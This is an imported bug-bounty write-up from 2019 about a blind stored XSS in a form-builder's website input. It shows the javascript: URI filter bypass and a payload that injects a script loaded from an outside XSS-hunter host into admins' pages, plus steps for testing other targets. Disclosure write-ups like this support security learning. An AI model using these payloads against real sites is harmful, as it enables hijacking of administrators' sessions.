---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-03-13_hack-your-form-new-vector-for-blind-xss.md
original_filename: 2019-03-13_hack-your-form-new-vector-for-blind-xss.md
title: Hack Your Form-New vector for Blind XSS
category: documents
detected_topics:
- xss
- sso
- command-injection
tags:
- imported
- documents
- xss
- sso
- command-injection
language: en
raw_sha256: 9984778ce0b02ded3a710fd3e6f4396243dde4774e113619a41279d873c36256
text_sha256: 5509620a2d994a5fd5da961f55615961133c37b9dcfb4bec0076f48d66dcbfdd
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Hack Your Form-New vector for Blind XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-03-13_hack-your-form-new-vector-for-blind-xss.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `9984778ce0b02ded3a710fd3e6f4396243dde4774e113619a41279d873c36256`
- Text SHA256: `5509620a2d994a5fd5da961f55615961133c37b9dcfb4bec0076f48d66dcbfdd`


## Content

---
title: "Hack Your Form-New vector for Blind XSS"
url: "https://medium.com/@GeneralEG/hack-your-form-new-vector-for-blind-xss-b7a50b808016"
authors: ["Youssef A. Mohamed (@GeneralEG64)"]
bugs: ["Blind XSS", "Stored XSS"]
bounty: "800"
publication_date: "2019-03-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5364
scraped_via: "browseros"
---

# Hack Your Form-New vector for Blind XSS

Hack Your Form-New vector for Blind XSS
Youssef A. Mohamed
Follow
3 min read
·
Mar 13, 2019

72

Hello Pentesters,

I’m Youssef A. Mohamed aka GeneralEG
Security Researcher @CESPPA , Cyber Security Engineer @Squnity and SRT Member @Synack

Press enter or click to view image in full size
Today I’m gonna share a juicy finding with you.

Talking about bypassing a couple of filters to execute malicious javascript codes easily and achieve a Blind Stored XSS.

“I found this issue in a lot of targets so, I will take one of these programs as an example.”

The program is private so let’s call it redacted.com

Recently I was testing in this program and after some recon, I found that the website offers a specific service (Create Forms).

How does this service work?
1)Creator User create a form
2)Creator User share the link with visitor
3)Visitor fill the form
4)The filled information will be available for the Form’s Creator at redacted.com/manager/{Form ID}/

So while testing the “Creating form” functions, I’ve found that there’s a Website input

I made a simple form.

Then opened as the form as a visitor.

At the first I tried to bypass it as the basic style:
(thought that if I wrote website.com?” payload it will execute)

So, I entered:
https://example.com/?"%22&#34;

( “ + url encoded + html entities encoded)

Then opened the creator account to see what happened.

But unfortunately, the filter encoded the double quotes.
https://example.com&quot;%22&amp;#34;

and noticed that the Link rendered in (a tag)

So, I decided to grab a cup of coffee :”D

Press enter or click to view image in full size
After a few minutes of deep thinking while drinking my coffee about how I will bypass this one.

I decided to start fuzzing in this input especially.. {Enter Website}

Get Youssef A. Mohamed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

While I’m fuzzing I noticed that the filter accepted test:https://example.com !

then tried javascript:https//evil.com
and it worked :D
“Evil loud laugh”

Now I’m sure that there’s XSS here
but it’s need real website merged with my payload so i wrote this one.

javascript:x=’http://x.c';alert('xss');//

Finally executed!

But wait we want to make it Blind XSS to attack the real admins (The best scenario).

So the last payload was:

javascript:eval(‘a=document.createElement(\’script\’);a.src=\’https://generaleg.xss.ht\';document.body.appendChild(a)');s='https://s.com'

¯\_(ツ)_/¯

That’s it!

Notes:

80% of my targets which have the Website’s input was vulnerable to the same scenario.
To make sure that your target is vulnerable to the same problem you need a few steps to make sure:

A. Check if the website is accepting other URI scheme like javascript:https://generaleg0x01.com or not?

B. Check if the website is rendering your https://generaleg0x01.com on HTML ‘a’ tag or not?

And in the most similar situations, the same payload will work perfectly.

Timeline:
20 December, 2018: Report Submitted
25 December, 2018: Report Reviewed and Triaged
30 December, 2018: Report Resolved & 800$ Bounty Awarded

Learned lessons:

Fuzz as much as you can.
Don’t try one technique to bypass the filter to try other techniques.

Happy Hacking!
